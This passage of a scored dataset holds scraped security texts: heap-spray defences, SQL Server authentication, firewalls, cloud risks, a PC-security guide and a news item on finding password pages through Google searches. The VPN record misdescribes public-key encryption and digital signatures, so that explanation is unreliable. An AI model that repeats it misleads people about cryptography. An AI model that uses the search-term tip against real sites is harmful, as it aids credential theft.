array allows access to undefined locations. This shows how careful one must be in designing such “solutions.” I think whether this particular idea is useful or not is less important than the idea that we may be able to use crypto like methods to protect software. The malware could learn the value of as follows. It would access some yet-undefined location and get back where was the value left in the location. For example, if , then the malware would learn , and this would defeat the method. Even if were arbitrary, the malware could use this approach to try to learn the secret random value . To avoid this attack there are at least two methods. We could assume that the data type does not allow the access of undefined values. It can return “undefined value,” but must monitor whether a location is defined or not. The other possibility is to use a more complex crypto solution. The advantage of the latter is the data type need not watch and check that no read occurs to a location that is undefined. I will discuss this method and related issues in a later post. Stopping Heap Spray—Other Approaches There are several other methods for protecting against heap spray attacks. One project is called Nozzle and is work of Paruj Ratanaworabhan, Benjamin Livshits, and Benjamin Zorn of Microsoft. This method is really an intrusion detection method: it watches the memory and reports if it detects the presence of objects that contain executable code. One problem with this method is the existence of false positives. They note that often data stored by programs is legal code. Another project is called BuBBle and is the work of Francesco Gadaleta, Yves Younan, and Wouter Joosen. They use a method very close to one I am suggesting. They replace parts of memory by random pieces—these random pieces cause the memory left by the attacker to be gone. This will cause the malware to cause an exception when it attempts to execute that part of memory. One problem is they only modify some of memory, and second is they need additional storage for the actual values of the modified memory. Can theory help in other ways in building secure operating systems? Does the idea here have any use in fighting heap spray attacks? Can we use more crypto in making secure systems?",
        "prob": "tensor([[2.0673e-06, 1.0000e+00]])"
    },
    {
        "text": "Endpoint Authentication Types The process for endpoint authentication involves granting permissions to allow users to connect to endpoints that are created on the server and specifying how authentication is performed. How authentication is performed is specified by using the AUTHENTICATION clause of the CREATE ENDPOINT statement or the ALTER ENDPOINT statement. The AUTHENTICATION clause provides the following options for specifying the authentication type: Anonymous authentication on an endpoint is not supported. For user access to an endpoint, the user must be a valid authenticated Windows user, either a trusted Windows user or a member account on the local computer. Basic authentication is one of the two required authentication mechanisms in the HTTP 1.1 specification. Basic authentication is made up of an Authentication header that contains the base64-encoded user name and password separated by a colon. For more information, visit http://www.ietf.org/rfc/rfc2617.txt. Consider the following when you specify BASIC: The PORTS value cannot be set to CLEAR. Credentials sent as basic HTTP authentication must be mapped to a valid Windows login. Basic authentication should only be used as a last resort. Because it uses easily decoded base64-encoding, if basic authentication is specified, the instance of SQL Server requires that a Secure Sockets Layer (SSL) port be used for HTTP connection. Basic authentication can be used in situations in which the user that is granted permissions to the endpoint is a local user on the server computer itself. Digest is the second authentication mechanism required by HTTP 1.1. This authentication is made up of the user name and password. This is then hashed with MD5, a one-way hashing algorithm, and sent to the server. The server has access to either the raw password, or a stored MD5 hash that was created when the password was set. The server can then compare the stored calculated value to the one provided by the client. This way, the client can prove that it knows the password without actually giving it to the server. For more information, visit http://www.ietf.org/rfc/rfc2617.txt. The credentials sent as part of a digest authentication over HTTP must be mapped to a valid Windows domain account. Local user accounts are not supported for Windows-based digest authentication. For security reasons, Windows-based digest authentication only supports MD5-sess encryption over domain controllers that are running under Windows Server 2003. NTLM is the authentication mechanism supported by Windows 95, Windows 98, and Windows NT 4.0 (client and server). This authentication mechanism is a challenge-response protocol that offers stronger authentication than either basic or digest. NTLM is implemented in Windows 2000 and later versions by a Security Support Provider Interface (SSPI). For more information, see Microsoft NTLM. Kerberos authentication is an Internet standard authentication mechanism. Kerberos authentication is supported in Windows 2000 and later versions by an SSPI. When Kerberos authentication is used, the instance of SQL Server must associate a Service Principal Name (SPN) with the account it will be running on. For more information, see Registering Kerberos Service Principal Names by Using Http.sys. For more information about Kerberos authentication, see Microsoft Kerberos. Endpoints configured to support integrated authentication can respond with either of the following authentication types as part of the authentication challenge: Kerberos or NTLM. Under this configuration, the server will try to authenticate the client with whichever type the client uses in requesting authentication. If that process fails for one integrated authentication type, the server will terminate the connection for the client. The server does not fall back to trying the other authentication type.",
        "prob": "tensor([[2.0192e-06, 1.0000e+00]])"
    },
    {
        "text": "This week, Intel unveiled its new Xeon Phi coprocessor, which puts an astonishing 50 x86 cores onto a single PCI-connected card. The term \"coprocessor\" should be understood in context. Every one of the Phi's cores can boot Linux and run any x86 software. However, the card itself needs to plug into a system that has an independent CPU, which basically oversees the Phi's operations. Hence, the coprocessor appellation. The first model to be released in Q1 of next year will have 50 cores, and the follow-up coprocessor slated for release in mid-2013 will have 60 cores. Each processor supports four threads, making for 200 threads for the initial Phi. The cores run at 1.05 GHz and sport a 512-KB L2 cache each. They collectively share 8 GB of GDDR5 memory. - Transitioning to Multicore Development - Crime Prediction and Prevention: A Safer Public through Advanced Analytics The aim of these processors is initially to attack tasks that are highly threadable. The Phis compete most directly with GPU processors, especially those from Nvidia. Even though they offer fewer threads than do GPUs, they deliver compelling programming advantages. If you've used CUDA or OpenCL, you know that programming GPUs is a descent into a netherworld of peculiar and rigid limitations. You're always acutely aware that you're doing something that the processor was not built to do. For example on Nvidia chips, there are multiple kinds of memory and only certain things can be done with each type of memory. Moreover, data has to be presented for calculation very carefully; otherwise, the processing lift of the GPU will disappear entirely. All of these problems go away with the Phi. It's a pure x86 programming model that everyone is used to. It's a question of reusing, rather than rewriting, code. This greater simplicity will be extremely appealing to many users who have spent long nights hacking code to get the GPUs to deliver properly. (The OpenACC initiative that we've covered several times recently is an industry effort to deal with this complexity.) The Phi can be programmed using all the typical parallel approaches: OpenMP, MPI, and Intel's own TBB and Cilk+. Intel has added some extensions to OpenMP to do the data offloading from the CPU to the Phi, but the company expects that the directives will be included in the upcoming OpenMP 4.0 spec. The coprocessor consumes around 225 W of power, which is a surprisingly low number given the number of cores. The heat generated when the Phi is running is low enough that the device can be passively cooled. As I mentioned, the Phi comes as a PCIe 2.0 card. The PCI connection means that the data transfer process from the CPU to the GPU is a limitation (as it is on GPU computing devices) because, at full tilt, it can transfer a maximum of 16 GB/sec. (By comparison, the Phi cores access the 8 GB of internal memory at 320 GB/sec.) Suggested reatail pricing for the initial model is $2649, with subsequent models expected to cost less than $2000. At this pricing level and with the ability to run x86 code without rewriting, the Phi most directly disrupts Nvidia's CUDA project and AMD's OpenCL work. At the moment, both Nvidia and AMD enjoy a price advantage in their GPU coprocessors, but it's not clear that the advantage is substantial enough that sites will continue preferring those solutions in light of the cost of rewriting code to run on their GPUs. Intel is leveraging its massive x86 installed base. I expect Phis to show up initially exactly where the GPUs are mostly used today for computation: in servers used by academia, research, and high-volume data transformation. Eventually, though, I expect the coprocessors to move down to workstations and subsequently to high-end desktops. An oft-asserted but dubious contention made in the popular press is that desktops today are so powerful that they are effectively supercomputers. Abstractly, this might be true if you compare them with their forbears of some years ago on computing power alone. However, supercomputers have (for well over a decade) been primarily highly parallel designs. Thus, the metaphor lacks a key elements it strives to express. However, with the advent of Intel's Phi coprocessor, this gap is closed and indeed we can expect to have true supercomputing power on servers and desktops soon at a price everyone can afford. As such, the Phi heralds a new era in computing.",
        "prob": "tensor([[0.0061, 0.9939]])"
    },
    {
        "text": "How to stay safe on the web There are all kinds of scams, viruses and other dangers out there. Here are simple steps you can take to protect your computer and personal information. Table of Contents Keep your software and operating system up-to-date Software updates contain vulnerability patches that protect your computer and personal information. - Update Firefox: To check for Firefox updates, go to the top of the Firefox window, click the menu and select .To check for Firefox updates, go to the top of the Firefox window and click the button, go over to the menu and select .To check for Firefox updates, go to the menu bar, click the See menu and select .Update Firefox to the latest version for details. - Update your plugins: Go to our Plugin Check page and follow the links to update any plugins that are out of date. - Update WindowsUpdate OS XUpdate your system: Make sure you have all of the latest security and stability fixes. Go to the menu, select and then .Go to the menu and select .Go to the menu, down to and select . Check your Firefox settings Firefox has many ways to help you stay safe on the Web. - How do I tell if my connection to a website is secure? - Disable third-party cookies in Firefox to stop some types of tracking by advertisers - Create secure passwords to keep your identity safe - Where are my logins stored? - There are also a lot of Firefox extensions that may be helpful. Follow best practices to protect your information Here are some handy tips to protect yourself. - Remember that YOU decide what information about yourself to reveal, when, why, and to whom: don't give out personally-identifiable information too easily; set your privacy settings in your social networking account; beware of sites that offer some sort of reward or prize in exchange for your contact information or other personal details. - Be conscious of Web security: never submit a credit card number or other highly sensitive personal information without first making sure your connection is secure; be on the lookout for \"spyware\"; use secure passwords and protect them with a master password. - Keep a \"clean\" e-mail address: use some pseudonymous or simply alternate address, and keep your main or preferred address only on small, members-only lists and with known, trusted individuals. - Do not reply to spammers, for any reason. - Realize you may be monitored at work: avoid sending highly personal e-mail to mailing lists, and keep sensitive files on your home computer. - Be conscious of home computer security: Turn off your computer when you are not using your Internet connexion; secure your Wi-Fi network with a strong encryption (WPA or WPA2) ; use a firewall.",
        "prob": "tensor([[2.1093e-06, 1.0000e+00]])"
    },
    {
        "text": "A firewall is a set of related programs, located at a network gateway server, that protects the resources of a private network from users of other networks. (The term also implies the security policy that is used with the programs.) An enterprise with an intranet that allows its workers access to the wider Internet installs a firewall to prevent outsiders from accessing its own private data resources and for controlling what outside resources its own users have access to. Basically, a firewall, working closely with a router program, filters all network packets to determine whether to forward them to their intended destination. A firewall also includes or works with a proxy server that makes network requests on behalf of workstation users. A firewall is often installed in a specially designated computer separate from the rest of the network so that no incoming request can get directly at private network resources. There are a number of firewall screening methods. A simple one is to screen requests to make sure they come from acceptable (previously identified) domain names and IP addresses. For mobile users, firewalls allow remote access in to the private network by the use of secure logon procedures and authentication certificates. Hubs, Switches and Routers Hubs, Switches and Routers are all devices that direct data between computers and other devices on your network. They come both in the standard CAT5 or CAT6 connection and wireless, which is able to relay data to your more mobile devices. Network cards fit in computers, laptops and printers to connect them to the rest of the network. Most network cards use a direct connection using a CAT5 cable, similar to a telephone cable. For laptops and mobile devices such as Pocket PC's and Palm Pilots, or in areas that installing network cables might be costly or dangerous, it may be beneficial to use wireless network cards.",
        "prob": "tensor([[0.0038, 0.9962]])"
    },
    {
        "text": "Computer hackers have adopted a startling strategy in their attempts to break into websites. By using the popular search engine Google, they do not have to visit a site to plan an attack. Instead, they can get all the information they need from Google's cached versions of web pages, say experts in the US. One way that hackers can break into a website is by hunting for private pages that contain the usernames and passwords required to access secure parts of the site. These pages are usually hidden from the casual browser because there are no hyperlinks to them on the web. But sometimes websites contain hidden hyperlinks or indexes that point to these private sites. These links may be inserted by faulty software, or they may be created by the owner for temporary use and later forgotten or not properly deleted. Either way, they are serious security loopholes. Hackers usually hunt for these private pages by trial and error, an activity that an alert webmaster can spot by monitoring traffic on supposedly private parts of the site. But search engines now make this kind of trawling unnecessary, says Johnny Long, a professional hacker based in the US who is hired by companies to test their security. Search engines build their databases by systematically following the links they find on web pages. The search engine then records the contents of each page. So if a website contains a link to a sensitive page, a search engine will record it. These pages would still be hard to find if web servers did not often use the same name for pages that contain passwords and other sensitive information. For example, one common filename for passwords is \"bash history\". Long says an obvious combination of search terms would include the terms \"bash history\", \"temporary\" and \"password\". Since Google makes its cached pages available, hackers can access this information without alerting a webmaster, even if the data has since been removed from the web. Long plans to outline the technique this week at Defcon, the annual hackers' conference in Las Vegas. Google says it bears no responsibility for the way the information it collects is used. \"Our search tools are very useful to researchers. There is not a lot we can do to prevent hacking,\" says a company spokesman. The responsibility for securing a site lies with the people operating it, says Danny Sullivan, editor of the website SearchEngineWatch.com: \"Search engines make it easier for everyone to gain information, hackers included.\" If you would like to reuse any content from New Scientist, either in print or online, please contact the syndication department first for permission. New Scientist does not own rights to photos, but there are a variety of licensing options available for use of articles and graphics we own the copyright to. Have your say Only subscribers may leave comments on this article. Please log in. Only personal subscribers may leave comments on this article All comments should respect the New Scientist House Rules. If you think a particular comment breaks these rules then please use the \"Report\" link in that comment to report it to us. If you are having a technical problem posting a comment, please contact technical support.",
        "prob": "tensor([[2.0488e-06, 1.0000e+00]])"
    },
    {
        "text": "Securing Virtual Private Networks (VPN), Page 2 Asymmetric Encryption, or public key encryption, depends on a pair of keys called public key and private key; hence the name. The keys are selected such that, if data is encrypted through key 1, it can be only decrypted through key 2 and vice versa. Of the two keys, we tell about one to everybody and call it a public key. The other is kept private for decrypting and called a private key. For example, our e-mail account has a public e-mail address that we give to everyone we want to but we won't tell the password to anyone. Suppose a person named Linda is a broker and she gets a request mail by James Anderson for buying some stock shares for his company. She performs all the arrangements and sends a confirmation mail to James. In the end, she sends a bill to him for the payment; at this point, James completely denies that he has ever sent a mail to Linda for any stock shares. Now what should Linda do? She is in extreme trouble because there is no clue to prove that James was the actual e-mailer. The solution is provided by the use of public key encryption; if Linda has encrypted the data by a public key, it can be decrypted only through Linda's private key which should be told only to James, so when James replies to the confirmation mail for the shares, it is known for sure that the answering person is no other then James Anderson and he is caught. This is source authentication. If we use the hashing scheme, such as MD5, on our data and generate a hash value for it at the source computer and send it along the data to the target, the destination computer will also compute its hash code for the received data. If the hash generated by the destination is same as the one received by the source, our data integrity is preserved; in other words, the data has reached its destination without any change or loss. This hash code is called a digital signature when sent with e-mail data. - Data Integrity - Data origin authentication - Replay prevention - Limited traffic flow confidentiality Replay prevention means that if somebody gets to know the keys by some means and resends your messages again or if someone gets to know the user name and password of your account, he or she can directly learn all your important business transactions and deals with others and can enjoy full authority to make other deals with them on your account using your name. IKE is a mechanism in IPSec where we exchange the key. It is a hybrid protocol that implements Oakley and Skeme key exchanges inside the ISAKMP framework. While IKE can be used with other protocols, its initial implementation is with the IPSec protocol. IKE provides authentication of the IPSec peers, negotiates IPSec keys, and negotiates IPSec security associations. The main features of IKE are as follows: - Negotiates policy to protect communication - Authenticated Diffie-Hellman key exchange - Negotiates (possibly multiple) security associations (SA) for IPSec. Diffie-Hellman is a public-key cryptography protocol that allows two parties to establish a shared secret over an unsecured communication channel. Diffie-Hellman is used within IKE to establish session keys. 768-bit and 1024-bit Diffie-Hellman groups are supported. Security Association (SA) combines the agreed upon principles for VPN communication. This is done by IKE. The secret key exchange is the main process so that the dependent data to be delivered is secured. Isakmp + oakley is the IKE policy that we define to start the encryption process. The Internet Security Association and Key Management Protocol (isakmp) is a protocol framework that defines payload formats, the mechanics of implementing a key exchange protocol, and the negotiation of a security association. Oakley is a key exchange protocol that defines how to derive authenticated keying material. Skeme is a key exchange protocol that defines how to derive authenticated keying material, with rapid key refreshment. MD5 (Message Digest 5) is a hash algorithm used to authenticate packet data. HMAC is a variant that provides an additional level of hashing. The Data Encryption Standard (DES) is used to encrypt packet data. IKE implements the 56-bit DES-CBC with Explicit IV standard. Authentication header is used for data integrity and source authentication whereas encapsulating security protocol is used for confidentiality.",
        "prob": "tensor([[0.0026, 0.9974]])"
    },
    {
        "text": "Security in the Cloud Security risks are a concrete expression of the lack of control a business faces when considering moving critical business systems to the cloud. From the perspective of the enterprise, there are seven major risks to be considered. Of these seven, four can be easily controlled or mitigated by the Enterprise. The remaining three remain the responsibility of the cloud provider of which the Enterprise has little real control, other than voting with their wallet. It may be argued that the Enterprise should make “demands” of the cloud provider through the use of contracts or third party audits, but in reality the market will determine the amount of security provided to Enterprises by cloud service providers and the level of acceptable risk. It may turn out that the cheaper price of cloud computing comes with necessarily increased risk, which may be a self-limiting factor in itself to the pervasive use of cloud computing by Enterprises. We outline the top security risks as follows: 1. Insecure, Porous APIs: Most cloud services offer two categories of web-accessible APIs: Those based on web services (called SOAP) and those based on pure HTTP (called REST). Increasingly, some cloud providers are offering only REST style APIs which lack robust “Enterprise class” message level security and authentication mechanisms. Some APIs, such as the Twitter API are purposely designed for rapid development and allow and even encourage the use of unprotected user credentials which are more susceptible to man in the middle or replay attacks. While some providers, such as Amazon.com offer strong authentication mechanisms, it’s not clear yet how well these APIs stand up to content-based threats such as code injection, denial of service attacks, script injection, or malicious XML content. Moreover, it’s also not clear how much trust should be placed in data received by the Enterprise from a cloud API for potential threats. A compromised cloud service API session may be a direct avenue for an attack. Internal information systems exposed to the cloud at the API layer offer a universal tunnel for a savvy attacker. Without explicit protection, cloud APIs essentially expose previously guarded Enterprise data across the Internet into the hands of a third party. Moreover, for IaaS systems that expose XML based APIs for image management, these management APIs also require strong authentication and access control as an attacker may conveniently replace a trusted machine image with a rouge one. 2. Logical Multi-Tenancy: With shared cloud computing infrastructure, the division of Enterprise data is now logical rather than physical. This logical separation is typically achieved through the use of virtualized infrastructure which is a cheap and easy way to support a multi-tenant architecture at the cloud service provider. The perceived risk in this scenario is for an attacker to subvert the logical division provided by the guest virtual machine and gain access to the data of another tenant. A number of attacks on virtual machines, from detecting the presence of a hypervisor to running arbitrary code on the host have been documented3. These attacks highlight the uncertain security of multitenant, shared environments for critical Enterprise data. An Enterprise horror story would be an attacker signing up for a “free” account at the cloud service provider, detect the presence of a virtual machine and “escape out” of the VM instance to access the physical server operating system and potentially gain access to the Enterprise data. Technology such as Intel® Trusted Execution Technology (TXT) are available that can mitigate this type of attack, but responsibility for implementation ultimately still lies with the cloud service provider. 3. Data Protection and Confidentiality: Data stored, processed or indexed in a remote cloud service defines the extent of the new perimeter for the Enterprise. This new “fuzzy” boundary changes and moves with the data itself, not the traditional firewall. A necessary complication here is that for data to be used effectively by cloud services it must remain unencrypted or else SaaS providers will have a hard time indexing it for any function that relies on search. Common examples include spell-checking in a Google document or looking up sales leads in a CRM application. The Enterprise may have to give up encryption and data privacy requirements for some of its data but should also recognize the option of applying selective field or message level protection mechanisms for data before it reaches the cloud. A practical example of this is protecting employee or critical customer information on messages before the data is released to the cloud. This is one aspect of data protection that an Enterprise can control on data before it reaches the cloud service provider. 4. Data Loss and Reliability: When critical business data is moved to a cloud service, there is some inherent risk of data loss. Even if cloud service vendors offer multiple back-ups and data redundancy, there is no perfect way to protect against the failure of physical media and disasters are apt to strike at just the wrong time. To take an example, services such as Amazon’s storage service offer “credits” in the face of data unavailability4 within a given month. This SLA may be too weak a proposition for business critical data and Enterprises may need more protection to manage this risk. Data loss and unavailability at precisely the wrong time may completely cripple an Enterprise. It may be argued that this is a false risk because the Enterprise has a similar risk of catastrophic data loss inside its own datacenter and simply moving the data to the cloud doesn’t change the equation. This claim ignores the fact that the cloud service provider is offering the same product at a much cheaper price and the reliability that the Enterprise has built around its data may simply not be present with the cloud service provider. It should be noted that this risk may turn out to be a red herring. The convenience and cost savings of the cloud service and record of actual failures may reduce this potential risk to near-zero, but it is too early to tell. 5. Audit and Monitoring: The first step in managing the security of any system to know when specific risky events occur. If an Enterprise decides that cloud services provide value to the Enterprise but wants to audit when these services are accessed to evaluate risk, it needs a way to know when data flows to and from the cloud. Enterprises need to know who is making the service request, when the request is happening, how much data is sent or received and how the data is used. Given the convenience and ease with which cloud service providers can be accessed the biggest risk to an Enterprise concerns the use of unmanaged “rogue” cloud services or projects that go unnoticed or unmanaged by the Enterprise CSO. 6. Cloud Provider Insider Threats: A potential problem or weak spot with cloud services is the mismatch between the security requirements inside the Enterprise as compared to those employed by the cloud service provider. To take an example, many large Enterprises make special efforts to secure “endpoint” data on IT-issues laptops with two-factor authentication technology, forced password rotation and fully encrypted hard-disk drives. Moreover, data is often segmented with access controls that distinguish between full employees and contractors, especially in large companies with diverse geographies. In most cases these controls increase the security of the Enterprise data. It should be noted that has taken Enterprises many years to reach this level of increased protection. Once the data is moved from protected assets to the cloud, however, an instant “weak spot” is created. Security breaches are often breaches of the weakest link, and a determined attacker motivated either by financial gain or industrial espionage will likely find it easier to execute an insider threat from the cloud service provider to gain access to the Enterprise data rather than try to execute a brute force attack on an encrypted hard disk. It should be noted that this is not the same as “hacking into Amazon’s API” or “hacking Google documents.” Sophisticated attackers use social engineering techniques and insider connections to find the weakest link. A motivated attacker may even take a low level job at the cloud provider itself if it provides an easier path to the Enterprise data. 7. Account Hacking, Tiered Access Control and Authorization: While hacking an account through a stolen password or compromised credential is nothing new, Enterprises to date have done a decent job of segmenting credentials and access control throughout their infrastructure. This is actually a property or benefit of the somewhat localized security inherent in individual operating systems and the uses of role based (RBAC) and attribute based access control (ABAC) within the Enterprise. In other words, if an attacker gains root access to a networked system or database they may have access to other assets, but the breach of a single system is more often than not directly localized to the breached system. Further, breaches of a single account are self-limiting by the role or attributes associated with that account in the Enterprise LDAP system. It is true that sophisticated attackers can use information from any compromised system as a stepping stone for more sophisticated attacks, but more work is required by the attacker unless they are extremely lucky in breaching the exact system they need. If we contrast this to cloud service providers, a few such as Salesforce.com have rudimentary segmented access control and privileges5, but for the majority of these a breach of one account may grant the keys to the entire castle. In fact, the pay-off for an attacker who knows that he must hack just one account to gain access to all of the Enterprises resources may seek to employ cheap, readily available cloud computing resources for brute force attacks on passwords and cryptographic keys. Moreover, fine-grained authorization of Enterprise resources is a problem just now being solved inside the Enterprise and it will be some time before cloud providers reach the same sophistication of locking down the use of individual data elements, fields, URIs, resources or API calls to individuals with a specific role or specific attributes. Account hacking from an Enterprise insider also needs to be considered. Once the Enterprise moves to cloud computing traditional insider attacks can be more costly because the Enterprise must rely on the cloud provider to help prevent the insider breach. In short, not only are the keys to the castle held in the cloud, but the Enterprise has to protect its traditional assets and now cloud assets from insider attacks. The previous seven risks are summarized in Table 1. Here we list the risks, a description of the threat and which party (Enterprise or Cloud Provider) is on the hook for reducing the threat. Ultimately, shoring up security risks is the job of both the Enterprise and the cloud providers. Short of a boycott, however, Enterprises have little real control over how security is implemented on the provider side. Cloud providers have yet to segment their offerings to provide increased levels of security targeted for Enterprise requirements such as higher levels of risk protection, integration with Enterprise identity systems, guarantees around multi-tenancy platform sharing (or isolation) and integration with monitoring, alerting and security event management systems. Instead, providers appear to be implementing minimum levels of security for their perceived target market. Whether this minimum security will rise as the industry matures is an open question, but for Enterprises that need to reduce risk while cautiously adopting cloud services we advocate the use of a high performance edge-oriented service gateway for those categories of risk that the Enterprise can control. This provides the necessary balance between the cost savings promised by cloud computing and the management of tangible risks that are under the Enterprise control. The next section outlines the concept of a service gateway and how it can reduce risk in four areas: (a) API protection and strong authentication, (b) Data protection and leakage, (c) Auditing and Monitoring, (d) Access Control and Authorization.",
        "prob": "tensor([[2.1200e-06, 1.0000e+00]])"
    },
    {
        "text": "Security and Performance Issues The dangers of computer viruses are often discussed, but you may not be aware of other hazards that can jeopardize your privacy, damage your files, and cause frustrating Fortunately, implementing some simple strategies can not only secure your computer and keep your data safe, but can make your computer work faster and more efficiently. - Reviews the risks for a computer with excessive clutter, speed and performance drains, insufficient security protection, and corrupted settings. - Suggests repairs and preventative measures that can both protect your computer and improve its speed, stability, and efficiency. - Provides definitions of key computer and security terms. Security and Performance Terms Defined Risks posed by unneeded files Every time you work on your computer or browse the Internet, temporary files, cache files, and cookies are saved to your hard drive. Most of these are files that you will never use and do not need to save. More unneeded buildup occurs from deleted files accumulating in the Recycle Bin. All this debris clutters your computer and overtaxes its resources. - Reduction in processing. Unneeded files consume memory and take up drive space. Instead of focusing on processing the services you really need, your computer is using resources to process useless items. - Recurrent crashes and lock-ups. A glut of unnecessary files increases drive fragmentation, which burdens the hard drive. With an excessive amount of debris, Windows can start to behave in unusual ways, including locking up or crashing. - Endangered privacy. Anyone who has access to your computer can see the Web sites you have visited and easily open files you have deleted. - Erase temporary files. Simply deleting files from your Web browser cache or temporary directories does not completely erase these tracks. Most security advisers recommend using software that can thoroughly clean out cookies, temporary Internet files, and cache files. - Empty the Recycle Bin. Windows stores deleted items in the Recycle Bin for easy recovery, and as you work on your computer, these deleted files quickly accumulate. Periodically empty the Recycle Bin to reclaim valuable hard drive space. Note: Items left in the Recycle Bin also pose a privacy risk because these files can be easily retrieved. Where confidentiality is critical, not only empty the Recycle Bin, but also use a data wiping program to thoroughly obliterate data. - Remove unneeded files and programs. Occasionally review the data you have saved and installed. Delete the documents and files you no longer want and uninstall programs you are no longer using. Consider archiving rarely used files to a CD or other removable media. Risks posed by speed and performance drains Various inefficiencies can bring your computer’s processing to a crawl, including fragmented hard drives, splintered system memory, scattered registry entries, and unneeded programs starting with Windows. - Slow boot times. Various programs and services are set to load when Windows loads. Some of these programs, such as antivirus protection, are desired, but many are useless and needlessly slowing the time it takes to start your computer. - Reduction in processing. When hard drives and system memory become fragmented, computer performance is significantly slowed. Files take longer to open and programs take longer to start. - System and file damage. Highly fragmented files are more prone to becoming corrupt. A highly fragmented hard drive places more strain on the heads, which in severe cases can lead to a head crash and a loss of data. - Exposure to infections. Trojans (malicious software) might also be loading at startup. Trojans are usually designed to load when you restart your computer. - Defragment your hard drive and system memory. Defragmenting your hard drives reorganizes scattered data, which boosts file access speed and extends the life of the drive. Defragmenting system memory reclaims valuable memory and improves PC efficiency and speed. - Compact the registry. Compacting the registry reorganizes entries, which maximizes free space and improves the efficiency and speed of registry processing. - Remove unneeded services from startup. Eliminate startup items that are unnecessary. Removing these unneeded performance drains will boost your PC’s speed, particularly the time it takes to boot, and will eliminate potentially dangerous Risks posed by malicious software Computer viruses, hackers, and other Internet dangers continue to pose a high risk. A range of malicious programs (viruses, worms, Trojans, etc.) are designed to damage computers or obtain confidential information from them. These infections can wreak havoc by causing permanent computer damage, destroying data, and enabling identity - Reduction in processing. Infections can cripple a system and bring processing to a halt. Viruses can make dangerous changes to the vital registry, causing system slowdowns and crashes. - Lost files. Your files – treasured photos, valuable music, important financial records – can all be destroyed if your computer becomes infected. - System and file damage. Viruses are designed to alter the operation of a computer. In addition to damaging files, viruses can harm your registry, your operating system, and even your hardware. - Data and identity theft. Trojans can enable the theft of any data saved on your computer, including banking and credit card information, passwords, address books, and other private information. - Financial risk. The monetary cost of recovering from data loss or identity theft can be devastating. - Spreading of infections to others. You can unknowingly spread viral infections to your friends, family, and business associates just by sending an email or leaving your computer unattended. Hackers can secretly take control of your PC and use it to attack and infect other computers. - Use a firewall. A firewall is vital to secure Internet activity. A firewall puts up a barrier against hackers and other intruders, but allows the Internet access that you do want. Configure the firewall so that only the programs and Web sites you trust are allowed to pass through. - Use antivirus software. Antivirus software is a must-have for anyone who uses the Internet. This software blocks computer infections and detects and removes any existing infections. Make sure you keep the virus signatures up to date for - Patch known security flaws. Many malicious programs exploit known security vulnerabilities in operating systems and browsers. Install the latest security patches, or use a specialized program that can automatically repair these flaws. - Only download trusted programs. Only download programs from trusted Web sites or refer to a trusted source for information. Do not install software if you are not sure about it. - Back up important files, including the registry. Establish and follow a schedule for regular backups of your data. Ideally, use a backup program that backs up all files, including programs and hidden operating system files. Regular backups of the registry are also recommended to protect its critical settings. - Permanently erase deleted confidential data. A file deleted through Windows is not completely erased; even though you can't see the file, someone using easily available tools can recover it and view its contents. For highly confidential data you have deleted, use data wiping software that completely erases all data remnants. Risks posed by corrupted settings Over time and with regular usage, a computer can slowly degrade and become unstable, with frequent crashes, perplexing error messages, and a host of other unexpected nuisances. Some defects that can crop up over time are invalid registry references, broken shortcuts, hidden spyware, obsolete uninstallation files, and physical errors on the hard drive and other devices. - Reduction in processing. Unneeded uninstallers and other invalid data in the registry overburden Windows processing. Spyware wastes system memory and can slow or stop Internet processing and lead to overall sluggish performance. - Recurrent crashes and lock-ups. Damaged hard drives, spyware parasites, obsolete shortcuts, and inaccurate registry references frequently cause computer crashes and lock-ups. A volatile computer is extremely frustrating and can become - Exposure to infections. In addition to burdening system memory, spyware has been used to deliver Trojans and viruses. Any program designed to install on a computer without the user’s knowledge carries a potential security risk. - System and file damage. Damaged sectors on a drive can prevent files from being accessed or saved and can cause system crashes. Spyware often incorporates poorly or carelessly designed functions that can harm your computer’s operating system and cause conflicts with your valid software. - Use spyware removal software. Spyware is created with covert techniques that make it difficult for people to spot. The safest approach is to use software that scans for and deletes spyware. Note: Do your research when dealing with unknown vendors. Some spyware removers advertised as “free” are actually spyware themselves, or contain Trojans and viruses. - Repair hard drive errors. A damaged hard drive can prevent you from saving files and retrieving existing files. Using software to fix hard drive errors protects your data and improves PC stability. - Repair registry errors. The registry is vital to your computer's ability to run correctly and when it becomes corrupted, overall degraded performance occurs. Most technical advisors recommend that specialized software be used to make registry changes, rather than making manual changes. - Be cautious of so-called “free” programs. Free programs, such as file-sharing software, screen savers, and games, are regularly bundled with spyware. Disclosure of spyware is often hidden in the fine print of a license agreement. Be sure you understand what is packaged with a program before you download it. Adware is software that generates advertisements, usually as banner ads or pop-up windows. Adware is usually bundled with other software and installed without your knowledge. While usually not physically damaging or outright malicious, the intrusive behavior of adware can be annoying and waste system resources. Cache files are used to store information on a temporary basis for quick access. A common example of a cache file is a browser cache. Every time you open a Web page, your browser creates a cache file (a temporary copy) of the page's text and graphics. When you open the page again, your browser checks the Web site server for changes. If the page hasn't changed, your browser loads the page from cache on your hard drive, which is much faster than originally loading it from the remote server. A cookie is a small text file that some Web sites save to your local, hard drive while you are browsing the site. Cookies contain identifying information, such as log in and shopping cart information. Cookies are useful for loading Web site preferences and login settings, but they can also contain information that can be passed to others without your knowledge, usually for advertising purposes. Over time, as you create, delete, and download files, your computer cannot store data as one unit and instead will split it up and store pieces in various drive locations. A fragmented hard drive has a large amount of such scattered data and can significantly slow PC performance. Similar to hard drives and other storage media, system memory can also become fragmented with time and usage. Defragmenting reorganizes data so that components are stored closer to each other. Regularly defragmenting hard drives and system memory improves drive speed, reclaims valuable memory, and extends the life of your computer. Malware (MALicious softWARE) is a generic term covering a range of software programs that are designed to damage computers or to obtain unauthorized information from computers. Some specific types of malware include viruses, worms, and Trojans. The registry is a database that holds configuration settings used by your Windows operating system. The registry is vital to your computer’s ability to run correctly. It stores key data that Windows requires and continually references, such as user profiles and settings for installed software and hardware. Only manually edit the registry if you know what you are doing; making inaccurate modifications can severely damage your computer. Always back up the registry prior to making any changes. Spyware is tracking software that is installed on your computer without your notice or consent. It sends information about your computing activities back to its source, usually for advertising purposes, but sometimes for much more dangerous purposes such as identity theft or credit card fraud. The effect of spyware varies depending on what its creator’s intentions are and can include consumption of valuable system resources, random lockups, crashes, or slowdowns; Web browser Home page or search page redirection; unwanted software installation; and random or incessant pop-up ads. A Trojan, or Trojan horse, is a software program that appears to be desirable or useful, but intentionally does something you do not expect. The effects of Trojans can range from simply displaying pop-up ads to destroying files or enabling the theft of data. Trojans are distributed in executable files, such as through email attachments, CDs, and Internet downloads. People can be lured into installing a Trojan because it appears that it will serve a legitimate purpose. Unlike viruses and worms, a Trojan is not designed to make automatic copies of 